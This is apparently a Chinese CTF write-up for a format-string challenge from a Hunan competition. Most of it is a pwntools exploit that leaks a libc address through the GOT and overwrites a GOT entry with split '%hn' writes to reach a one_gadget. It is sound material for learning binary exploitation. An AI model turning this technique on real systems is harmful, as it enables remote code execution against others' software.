---
title: 湖南安全竞赛fmtstr题
date: 2018-11-25 17:59:14
tags: 题目
---
<h1><strong>知识点</strong></h1>
1.查偏移写入 64位前6个参数是存在6个寄存器里 所有gdb查到的位置需要+6
2.写入最好分段写入不要一次性写入太多 否则会崩溃
<h1><strong>exp</strong></h1>

```python
#!/usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

#文件加载
#context.log_level = 'debug'
io = process('./aa')
elf = ELF('./aa')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#当part2部分大于part1
def exp2():
  payload = ''
  #分2部分写入后4字节 因为全部写入4字节太大 可能会崩溃
  payload += '%'+str(part1)+'d%12$hn'+'%'+str(part2-part1)+'d%13$hn'
  payload += 'a'*(32-len(payload))
  payload += p64(0x601028)+p64(0x60102a)
  print payload
  gdb.attach(io)
  io.sendline(payload)
  io.interactive()
#当part1部分大于part2
def exp1():
  payload = ''
  payload += '%'+str(part2)+'d%12$hn'+'%'+str(part1-part2)+'d%13$hn'
  payload += 'a'*(32-len(payload))
  payload += p64(0x60102a)+p64(0x601028)
  print payload
  io.sendline(payload)
  io.interactive()

gets_got = elf.got['fgets']
log.info("got:0x%x" % gets_got)
#偏移得到gets_got中的地址
payload = '%9$s'+'aaaa'+p64(gets_got)
io.sendline(payload)
t = io.recv()
#截取的地址会前面4位是6161因为0会被自动省去 就得到为了补齐的a 自己当作0就可以了
gets_addr = u64(t[0:8])
log.info("gets_addr  : 0x%x" % gets_addr)
#常规泄漏地址 one_gadget自己试试那个适合
libc_base = gets_addr - libc.symbols['fgets']
log.info("libc_base: 0x%x" % libc_base)
one_gadgets = libc_base + 0xf02a4
log.info("one_gadgets: 0x%x" % one_gadgets)
#截取后2字节
part1 = hex(one_gadgets)[-4:]
print part1
#截取后4-2字节
part2 = hex(one_gadgets)[-8:-4]
print part2

part1 = int(part1,16)
part2 = int(part2,16)
#gdb.attach(io)

#判断part1和part2大小 因为后面分2部分写入 打印出来的需要被累加到后面的写入 所以需要判断大小
if part1 > part2:
  print "exp1"
  exp1()
else:
  print "exp2"
  exp2()
```
